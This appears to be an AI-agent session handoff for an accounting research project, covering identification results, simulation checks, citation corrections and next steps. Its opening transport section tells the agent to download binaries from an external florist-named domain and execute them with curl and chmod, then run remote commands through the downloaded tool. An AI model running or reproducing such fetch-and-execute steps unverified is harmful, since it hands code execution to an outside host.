---
project: wealth-tensor
gh_sha: 2a119ff5d5e56d692b1e9983a8a08c033e04cc11
updated: 2026-08-12
session: wealthTensor-13
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**Re-run before diagnosing.** *First collect has now worked in -06 through -13, without exception.*
Cycle ~4 min.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-14 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-14 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`** — without it a leaf can reach
`active` but never `trusted`, because independence is unprovable after the fact.

**Never inline a multi-line commit message in a `dx '...'` argument.** One apostrophe closes the
quote and `git commit` succeeds with a truncated message while the shell errors about the leftovers.
Write it to a file, `--put` it, `git commit -F`. Used five times this session, no incidents.

`dx --get` fails on binary — base64 both ways. Quote remote paths. Give long `dx` calls five
minutes. Exit 3 = never reached darwin, safe to re-run; exit 4 = started, check state first.

### The editing tool that made this session cheap — use it

Do **not** edit the manuscript with `sed`, heredocs, or in-place regex. Write a Python patch script
locally, `--put` it, run it. Every edit is an exact-string replacement that **counts its anchor and
exits non-zero if the count is not 1**:

```python
def sub(label, old, new):
    global src
    if src.count(old) != 1:
        print(f"ANCHOR FAIL [{label}]: {src.count(old)} matches"); sys.exit(1)
    src = src.replace(old, new); edits.append(label)
```

Six patch scripts, twenty edit sites, two anchor failures — both caught *before* anything was
written, both line-wrap mismatches, both fixed in one round trip. The file is never left
half-patched, because nothing is written until every anchor resolves. `scripts/patchkit.py` exists
and is worth reading, but this four-line guard is the whole trick.

**Anchor gotcha, since it cost two round trips:** the manuscript is hard-wrapped at ~100 columns, so
an anchor you compose from memory will have the newline in the wrong place. Grep the region and copy
the wrapping exactly.

## 1 · WHAT HAPPENED — §4.6's OPEN QUESTION IS CLOSED, AND THE ANSWER IS BETTER THAN A YES

`-12` named the returns question in print as the sharpest thing the identification result raises, and
could not answer it. It is answered. **Yes, returns break the equivalence** — and the interesting
half is *how*, because the mechanism is not the one the question presupposed.

`scripts/wt085_returns_conditioning.py` — **7 severe, 0 vacuous**, 121 tests still green.

**Returns kill the small degeneracy on sight.** The mirror firm's asset decays at α rather than δ,
so two worlds whose books agree to 7 × 10⁻¹⁶ differ in return by α − δ — three percentage points a
year, indefinitely. §4.7 predicted this. It is the smaller half.

**Returns cannot touch the large one, and the reason is one line.** Grant an analyst *both roots
exactly* — strictly more than returns supply — and `wt084`'s continuum is untouched: φ still sweeps
[0, 1] with the reported series exact to 2 × 10⁻¹⁶, and every member of the family emits the
**identical return series, bit for bit** (2 × 10⁻¹⁶). **A return is a ratio, and the residual
degeneracy is a degeneracy in scale.** Ratios do not carry scale. No quantity of returns data bears
on it — not weakly, not asymptotically, not with a longer panel.

**What breaks the continuum is the NEWS, not the returns.** The degeneracy was a property of a
*noiseless* economic path. Once the realised decline rate varies period to period, matching the
driving term needs cα = α and cφ′ = φ simultaneously, which forces c = 1. Regressing the reported
series on its own lag, the return-implied path and that path's first difference recovers α, E₀ and φ
to 10⁻¹⁶ at σ = 0.15, against a design matrix that is **exactly singular at σ = 0**. Returns matter
because they are how the analyst *learns* the news.

**And the price is a rate, not a proof.** On the quiet branch, collinearity degrades as σ^−0.98 — a
clean reciprocal — and se(φ̂) as σ^−0.52, its square root, with weak-identification bias visible in
the mean by σ = 0.025. The exponents differ by a factor of two because the lagged reported value is
*itself* a near-constant perturbed by the same innovations, so the three regressors lose their
independence together and part of the loss cancels.

**The sample cannot compensate, and this is the best thing in the script.** The root-T rate is
**never attained at any horizon**: T 50 → 200 buys 1.22× where root-T buys 2.00×, and T 400 → 1600
buys *nothing measurable*. Every term in the estimating equation — signal, regressors and accrual
noise alike — is proportional to the asset's remaining value, so once the asset has decayed the
later periods are not noisy observations but **absent** ones. **The information about recognition
speed is a property of the asset: how much its value moves, and how long it goes on existing. The
analyst chooses neither.**

**The finding that runs FOR the field.** The variation identifying φ in this filter is return
variation — the same variation Basu's regression needs in order to run at all. An instrument
conditioning on returns is drawing on exactly the right information, and the return-variance
corrections the literature reached for empirically are operating on the *identification-strength
parameter* rather than on a nuisance. That is a defence of somebody else's specification arrived at
from outside it, and it is rarer than another teardown.

## 2 · TWO CHECKS FAILED, AND BOTH FAILURES WERE WORTH MORE THAN THE ASSERTIONS

Recorded because it is the reusable part.

**E5 was written asserting se ~ 1/σ**, from a back-of-envelope argument about the third regressor's
orthogonal variation. The run refused, twice. The first refusal exposed a **modelling error**:
accrual noise in fixed units of E₀ on a *multiplicative* path is relatively invisible when the firm
is large and overwhelming when it is small, which manufactures a U-shaped standard error out of
nothing and reads exactly like a substantive finding. The second refusal exposed that the envelope
had ignored the first regressor. The exponents are now **fitted and reported**, not asserted.

**E6 was written asserting root-T** and found the saturation instead — the best result in the
script, and it exists only because the check was severe enough to fail.

**The rule, banked globally: FIT THE EXPONENT, DO NOT ASSERT IT.** A scaling argument for a
simulated quantity is a hypothesis. Write the check as a fitted log-log slope with a reported value.
A check that encodes the guess cannot discover the guess is wrong.

**Symptom worth memorising:** a metric non-monotone in a parameter you expected to be monotone is
almost always your noise specification, not the world.

## 3 · THE PAPERS

**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **1,960 lines**. Prior version at
`paper-III.md.bak-pre-wt085`. §4.1–4.8 numbering preserved again; nothing renumbered.

| § | what changed |
|---|---|
| 4.2 | **Nerlove (1958) lineage added alongside Bateman** — the economics-native instance. Kuan citation **corrected** (see §4) |
| 4.4 | **Fisher & McGowan (1983) adopted as the rhetorical ancestor**, with its fate attached |
| 4.6 | third qualification **narrowed** from open question to pointer; **Dutta & Patatoukas (2017) separated explicitly**; Ryan (2006) title collision closed; δ-notation collision named |
| 4.7 | **the returns repair, with its price**, ahead of the disclosed-useful-lives repair. IV-reference-dose claim **re-sourced** |
| 7 | four survivals rows |
| — | abstract and contribution 3 updated; five references added, three marked NOT READ |

**Paper II** — **the free Road One paragraph is written.** §3.1. At matched budget the stock levy
moves Var[log a] by 6 × 10⁻⁶ — 0.076542 → 0.076536, i.e. not at all — while the flow levy cuts it to
0.051189. The stock base **truncates the outcome**, the flow base **damps the generator**, and both
register as a smaller Gini, which is why the distinction is invisible in the statistic normally
reported. It survived two handoffs unclaimed; it is claimed.

## 4 · THE REFERENCE WORK — ONE CITATION REFUTED ITSELF

Two load-bearing references were abstract-level and both freely available. Read at source.

**Kuan, Wright & Duffull (2023) — the citation was WRONG and is fixed.** §4.2 had them classifying
flip-flop as a failure of ***global*** rather than local identifiability. The paper says the
*opposite adjective*: "an issue of **local** identifiability in that there exists a finite set of
parameter values (rather than a single set) that solves the problem." Same taxonomy, wrong word in
their mouths, findable by any referee in their first paragraph. Their own qualification is now
carried too — the competing solutions are "not simply a function of swapping the rate constants" but
a partial permutation, n + 1 for an n-compartment model — and it *helps*: the accounting case, where
the exchange is a clean root swap, is the simplest member of the family rather than the general one.

**Also fixed: §4.7 asserted, uncited, that flip-flop is resolved by an intravenous reference dose.**
Kuan et al. do not say it. Re-sourced to what they do say — that it is "in the absence of intravenous
data" that elimination covariates load onto absorption parameters — plus their own remedies. The
analogy is unharmed and now rests on read text.

**Ball, Kothari & Nikolaev (2013 JAR) — characterisation HELD.** Their §4.4 is headed "Other
Determinants of Conditional Conservatism" and the determinant reading is explicit in their
conclusion. Asset maturity is one of several examples of a comparative static in their σx, not their
headline; §4.6 already reads that way. **Bibliography trap:** the MIT deposit is handle
**1721.1/87767**; 87766 is the *different* 2013 BKN paper in *The Accounting Review*.

**Dutta & Patatoukas (2017) was the live threat and is now separated in print.** Read at source
(open UCLA working-paper text). It is a **bias** claim, not an identification one, and the proof is
internal: their recognition parameter stays recoverable from the accrual-variance spread, which is
the repair they propose. **A claim a better statistic can repair is a claim about a statistic.**
Their three confounders are news-process properties — expected returns, cash-flow persistence,
return skewness — and their firm is a cash-flow stream with **no capitalised asset in it**, so the
object of our theorem has no representation in their model. Their δ is **our φ**; the collision is
named once, in §4.6, at first use.

**Griliches (1967) is CLOSED as a lead. Do not reopen it.** It was `-12`'s likeliest hiding place for
an economics precedent on root-exchange non-identification. His own *Citation Classic* retrospective
places his identification point on **error structure**, not roots, and no accessible source puts root
exchange in that paper. The real precedent was one citation away: the **Nerlovian combined
adaptive-expectations/partial-adjustment reduced form**, every systematic coefficient of which is
symmetric in β ↔ γ while the disturbance γ[u(t) − (1 − β)u(t−1)] is not. **Derived and checked here**
(`wt085` E7), not taken on report, and cited as lineage with the read-status saying exactly that.

## 5 · THE AT-BAT, RANKED

1. **The off-diagonal paper** (Paper III's Limitation 9). Now the largest unclaimed thing in the
   corpus. Co-occurrence of impairments across classes against an independence null: no observability
   proxy, no φ-to-GAAP bridge, no new data — the **688 events already collected are enough**.
   **Register before coding the instrument (WT-052).**
2. **Take the σ-and-lifetime result to the data.** §4.7 now says identification strength is a
   property of the asset, degrading as σ^−0.5 in return volatility and saturating within a few
   half-lives. That is a *testable design rule* and the registered sample can price it: rank the four
   GAAP classes by realised return volatility and asset life, and the theory predicts where a
   conservatism estimate is worth reading and where it is not. Nobody has run this. It is the natural
   empirical sequel and it needs no new data.
3. **Read the remaining abstract-level references at source.** Garrett (1994) and Bellman & Åström
   (1970) are the two still load-bearing in §4.2 and unread. Khan & Watts (2009) is load-bearing in
   §4.6. Kuan taught the lesson: **the one you do not check is the one with the inverted adjective.**
4. **Ryan (1995) + erratum + Beaver & Ryan (2000)** — JPASS trial,
   `~/Desktop/downloads/DOWNLOAD-QUEUE.md`. Run `scripts/provenance_check.py` on whatever lands.
   Basu (1997) is closed everywhere; the author-email route is the play.
5. **Two unread items the search flagged as possibly fatal to the Nerlove framing** — if either says
   the ambiguity out loud in print, the lineage claim needs restating, and better to find it
   ourselves: **Askari & Cummings (1977)**, *IER* 18(2), the survey of the Nerlove literature; and
   **McManus, Nankervis & Savin (1994)**, *J. Econometrics* 62(2), "Multiple optima and asymptotic
   approximations in the partial adjustment model" — "multiple optima" is exactly the symptom a
   permutation non-identification produces. Both paywalled; neither is a blocker.

## 6 · WHAT NOT TO DO

- **Do not restore the neat sentence.** *"PRE-001 was doomed by the φδ confound"* is false; `wt082`,
  `wt083` and the survivals ledger all assert its negation.
- **Do not re-claim the mathematics.** Bateman/flip-flop is conceded in §4.2 on purpose, and Nerlove
  now stands beside it. A session that "strengthens" the paper by removing a concession is undoing
  the two most valuable things `-12` and `-13` did.
- **Do not restore "global rather than local identifiability" to the Kuan citation.** It is the
  wrong adjective and the source is open — see §4.
- **Do not hand Jason a ranked list of problems as a deliverable.** WT-079. **Do not run a pure
  teardown.** WT-078 — the brief includes the whitespace or it does not ship.
- **Do not invoke Mayo, severity or error-statistical philosophy as a *warrant*.** Pragmatic
  justification.
- **Do not ask him to submit anything.** **Never add a free parameter to absorb an objection**
  (refused six times).
- **Do not rewrite or summarise the charter inside a handoff.** Read it; it is binding.

## 7 · TWO THINGS THAT WILL BITE YOU, FIXED HERE SO THEY DO NOT

1. **The coach ratchet counts the BIBLIOGRAPHY.** `handoff_gate.py --coach` measures conduct
   narration "outside §§6–11," and the reference list is outside §11. A reference entry that
   narrates its own correction — *"an earlier draft had them classifying…"* — moves the ratchet from
   6 to 7 and is a blocker. State what the source says; do not perform the revision. **Adding a
   section means deleting narration elsewhere, not refreshing `docs/.coach-baseline.json`.**
2. **`gate-selfcheck.sh` will likely fail on things that are not yours.** It failed at this session's
   wrap on an uncommitted `HANDOFF-floristAlix-2.md` in `~/Desktop/downloads` and on a `card-lint`
   stale reference — both belonging to a **sibling session mid-wrap** (`roster who` showed five live
   cloud siblings). Do not "fix" a sibling's in-flight artifact; check `roster who` first, and say in
   the handoff whose the failure was. Nothing in `~/repos/wealth-tensor` was dirty or unpushed.

## 8 · DEFINITION OF DONE

Three pre-prints posted. Paper III is the closest and is not blocked on argument: **§4 is finished
work** — theorem, proof, ancestry, both degeneracies, both repairs and the price of each. What
remains for Paper III is empirical (item 1) and bibliographic (items 3–4), not structural. **Resist
polishing §4.** It has been rewritten whole once and materially extended once; the next session that
touches it should be adding a result or reading a reference, not improving prose.

## 9 · ORIENT-THEN-GO

Emit one line — `Oriented: <state> · at-bat: <X> · opening with <first action>.` — then start
writing. Don't wait for the go, and ask for a ruling when you need one.

*The question was whether a second series rescues the theorem. It does — and the answer arrived
carrying a better one: the rescue's strength belongs to the asset, not the analyst, and it runs out
in a few half-lives no matter how long anyone watches.* ⚒️
